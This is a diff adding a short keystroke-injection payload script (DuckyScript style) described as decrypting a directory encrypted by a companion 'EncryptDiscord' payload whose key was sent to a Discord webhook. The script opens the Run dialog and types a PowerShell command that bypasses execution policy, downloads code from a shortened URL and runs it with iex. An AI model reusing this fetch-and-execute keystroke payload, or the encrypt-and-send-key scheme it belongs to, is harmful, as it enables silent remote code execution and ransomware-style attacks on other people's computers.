@@ -1,0 +1,8 @@
+REM decrypts directory encrypted by EncryptDiscord. Make sure to create a key.txt file inside the same directory with the key that was sent to discord webhook.
+
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell -NoP -Ep Bypass irm "t.ly/MEA1y"|iex; E-D -d -p "PATH/TO/DIRECTORY"
+DELAY 1000
+ENTER
